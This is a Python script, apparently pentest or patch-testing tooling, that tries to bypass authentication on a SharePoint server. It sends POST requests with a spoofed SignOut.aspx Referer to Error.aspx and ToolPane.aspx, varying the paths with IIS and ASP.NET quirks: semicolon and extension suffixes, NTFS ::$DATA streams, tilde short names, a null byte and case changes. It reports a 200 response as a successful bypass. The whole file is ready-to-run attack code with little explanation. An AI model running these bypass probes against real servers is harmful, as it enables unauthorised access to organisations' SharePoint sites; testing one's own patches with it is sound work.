# Test technology-specific quirks (ASP.NET, IIS)
# Purpose: Test IIS path handling quirks, ASP.NET routing edge cases

import requests

base_url = "http://10.10.10.166"
test_body = "test=data"

headers_bypass = {
    "Referer": "/_layouts/SignOut.aspx",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Test ASP.NET/IIS specific path handling quirks
test_cases = [
    # IIS semicolon bypass (path parameter)
    ("IIS semicolon: /Error.aspx;.jpg", "/_layouts/15/Error.aspx;.jpg"),
    
    # ASP.NET path extension bypass
    ("ASP.NET alternate extension: /Error.aspx/.jpg", "/_layouts/15/Error.aspx/.jpg"),
    
    # Unicode normalization
    ("Unicode: Error\u002Easpx", "/_layouts/15/Error\u002Easpx"),
    
    # IIS tilde enumeration character
    ("Tilde: Error~1.aspx", "/_layouts/15/Error~1.aspx"),
    
    # Null byte (should be rejected by modern ASP.NET)
    ("Null byte: Error.aspx%00.jpg", "/_layouts/15/Error.aspx%00.jpg"),
    
    # ASP.NET routing with extra path
    ("Extra path: Error.aspx/test", "/_layouts/15/Error.aspx/test"),
    
    # Case variations on vulnerable pages
    ("Case: error.aspx", "/_layouts/15/error.aspx"),
    ("Case: ERROR.ASPX", "/_layouts/15/ERROR.ASPX"),
    
    # Alternate stream (NTFS)
    ("NTFS stream: Error.aspx::$DATA", "/_layouts/15/Error.aspx::$DATA"),
    
    # IIS short name notation
    ("Short name: ERRORX~1.ASP", "/_layouts/15/ERRORX~1.ASP"),
]

for name, endpoint in test_cases:
    print(f"\n[*] Test: {name}")
    print(f"    Endpoint: {endpoint}")
    try:
        response = requests.post(f"{base_url}{endpoint}", headers=headers_bypass, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    *** BYPASS SUCCESSFUL ***")
        elif response.status_code == 401:
            print(f"    Result: BLOCKED (auth required)")
        elif response.status_code == 404:
            print(f"    Result: Not Found (endpoint doesn't exist)")
    except Exception as e:
        print(f"    Error: {e}")

# Test if ToolPane.aspx can be accessed through case variations
print("\n" + "=" * 60)
print("Testing ToolPane.aspx case variations (should be blocked)")
print("=" * 60)

toolpane_cases = [
    "/_layouts/15/ToolPane.aspx",
    "/_layouts/15/toolpane.aspx",
    "/_layouts/15/TOOLPANE.ASPX",
]

for endpoint in toolpane_cases:
    print(f"\n[*] Endpoint: {endpoint}")
    response = requests.post(f"{base_url}{endpoint}", headers=headers_bypass, data=test_body, timeout=10)
    print(f"    Status: {response.status_code}")
    if response.status_code == 200:
        print(f"    *** UNEXPECTED BYPASS ***")
    elif response.status_code == 401:
        print(f"    Result: BLOCKED (patch working)")
